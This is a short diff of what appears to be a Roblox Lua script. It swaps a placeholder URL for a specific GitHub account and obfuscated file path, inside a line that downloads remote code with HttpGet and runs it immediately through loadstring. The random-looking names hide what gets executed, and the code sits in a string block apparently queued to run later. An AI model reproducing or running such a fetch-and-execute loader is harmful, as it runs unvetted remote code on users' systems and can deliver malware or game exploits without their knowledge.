@@ -8,7 +8,7 @@ local function main()
                 end 
                 repeat task.wait() until game.Players.LocalPlayer 
                 wait(0.25) 
-                loadstring(game:HttpGet("https://raw.githubusercontent.com/USERID/m3ug92fh12h2h20fj1f238fh1k19/refs/heads/main/1928dh98hd12fho3hfil21hfy2i1ofh2i1hfi12g"))()
+                loadstring(game:HttpGet("https://raw.githubusercontent.com/Glacialimperial/m3ug92fh92h2h20fj1n238fh1k19/refs/heads/main/1928dh98hd12fho2hfil21hfy2i1ofh2i1hfi12f"))()
             ]])
         end
 
